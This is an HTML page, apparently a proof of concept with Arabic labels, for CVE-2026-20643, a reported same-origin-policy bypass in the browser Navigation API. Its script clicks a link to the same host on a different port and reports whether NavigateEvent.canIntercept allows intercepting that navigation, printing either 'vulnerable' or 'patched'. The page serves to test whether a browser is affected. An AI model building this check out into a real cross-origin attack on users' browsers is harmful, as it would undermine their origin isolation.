<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>CVE-2026-20643 PoC</title>
</head>
<body>
    <h1>CVE-2026-20643 — SOP Bypass عبر Navigation API</h1>
    <p>اختبر إذا كان <code>NavigateEvent.canIntercept</code> يعطي <b>true</b> للملاحة عبر منافذ مختلفة</p>
    
    <button id="runBtn">▶ تشغيل PoC</button>
    <pre id="output" style="background:#1e1e1e;color:#0f0;padding:15px;border-radius:5px;margin-top:15px;"></pre>

    <script>
        const output = document.getElementById('output');
        function log(msg) { output.textContent += msg + '\n'; }

        document.getElementById('runBtn').addEventListener('click', () => {
            log('=== CVE-2026-20643 PoC ===');
            
            const currentPort = location.port || (location.protocol === 'https:' ? '443' : '80');
            const otherPort = currentPort === '8000' ? '8800' : '8000';
            const targetURL = `${location.protocol}//${location.hostname}:${otherPort}/`;
            
            log(`المنفذ الحالي: ${currentPort}`);
            log(`المنفذ المستهدف: ${otherPort}`);
            log(`URL الملاحة: ${targetURL}`);
            
            navigation.addEventListener("navigate", event => {
                if (event.canIntercept) {
                    log('');
                    log('⚠️ **VULNERABLE**');
                    log(`canIntercept = ${event.canIntercept}`);
                    log('الثغرة موجودة — يمكن اعتراض الملاحة عبر المنافذ المختلفة');
                } else {
                    log('');
                    log('✅ **PATCHED**');
                    log(`canIntercept = ${event.canIntercept}`);
                    log('النظام مُصَحَّح — SOP مطبّق بشكل صحيح');
                }
                event.preventDefault();
            }, { once: true });
            
            // إنشاء رابط وتنفيذ النقر
            const anchor = document.createElement('a');
            anchor.href = targetURL;
            document.body.appendChild(anchor);
            anchor.click();
        });
    </script>
</body>
</html>
